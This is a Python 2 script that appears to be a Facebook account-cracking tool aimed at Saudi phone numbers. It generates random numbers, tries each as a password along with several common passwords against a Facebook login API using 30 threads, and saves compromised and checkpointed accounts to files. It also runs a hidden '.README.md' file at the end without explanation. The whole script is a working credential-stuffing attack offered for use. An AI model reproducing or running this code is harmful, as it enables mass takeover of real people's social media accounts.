import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5999):
    nmbr = random.randint(1000000, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo ="""
\033[1;91m
 ##     ## ##     ##  ######  
 ##     ##  ##   ##  ##    ## 
 ##     ##   ## ##   ##       
 ##     ##    ###     ######  
  ##   ##    ## ##         ## 
   ## ##    ##   ##  ##    ## 
    ###    ##     ##  ######  
\x1b[1;97m Author >> Error - 114
 My - Telegram >> iq_professor
 Ch - Teelegram >> anas_hacker0
===============================   
"""
        
back = 0
GUDD = []
cpb = []
oks = []
id = []
CorrectUsername = "error"
CorrectPassword = "511"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;92m[+] Username Bnusa >>> \033[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] Password Bnusa >>> \033[1;97m")
        if (password == CorrectPassword):
            print "\033[32m  Bzheet Afarm  " + username 
            
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;9m H a l a y a ! "
            os.system('xdg-open https://t.me/anas_hacker0')
    else:
        print "\033[1;9m H a l a y a ! "
        os.system('xdg-open https://t.me/anas_hacker0')
        
def menu():
    os.system('clear')
    print logo
    print
    print '\x1b[1;97m[1] Crack FB >>\033[32m Saudi Arabi\n\n\033[31m[0] Darchun \033[37m          '
    print
    print 31 * '\x1b[1;90m~'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;97mZhmara [1] Lebda >>>\x1b[1;97m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m - 050 - 053 - 054 - 055 -\n  -  056  -  058  -  059  - '
        print 31 * '\x1b[1;90m~'
        try:
            c = raw_input(' Saratakay >>> ')
            k = '+966'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] Halat Krd'
            raw_input('\n[ Garanawa ]')
            menu()
    elif bch =="0":
        exb()
    else:
        print '[!] Fill Hala ea'
        action()
    xxx = str(len(id))
    print 31 * '\x1b[1;90m~'
    psb('\x1b[1;97m Hamw Raqamakan >> \x1b[1;92m' + xxx)
    time.sleep(0.3)
    psb('\x1b[1;97m Wastan Tool Ctrl + Z ')
    time.sleep(0.3)
    psb('\x1b[1;91m Free >>> Tooool ')
    time.sleep(0.3)
    print 31 * '\x1b[1;90m~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m raqam' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' | pass' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CP]\x1b[1;91m raqam' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' | pass' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m raqam' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' | pass' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CP]\x1b[1;91m raqam' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' | pass' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234512345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m raqam' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' | pass' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CP]\x1b[1;91m raqam' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' | pass' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3)
            else:
                pass4 = '123456123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m raqam' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' | pass' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CP]\x1b[1;91m raqam' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' | pass' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 31 * '\x1b[1;90m~'
    print '\x1b[1;97m Prosaka Kotay Pehat '
    print '\x1b[1;92m Total successfull/\x1b[1;91mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '\x1b[1;91m [CP] La File Sabe Bu >> save/checkpoint.txt'
    raw_input('\n[ENTER] Bo Garanawa ')
    os.system('python2 .README.md')
if __name__ == '__main__':
    menu()
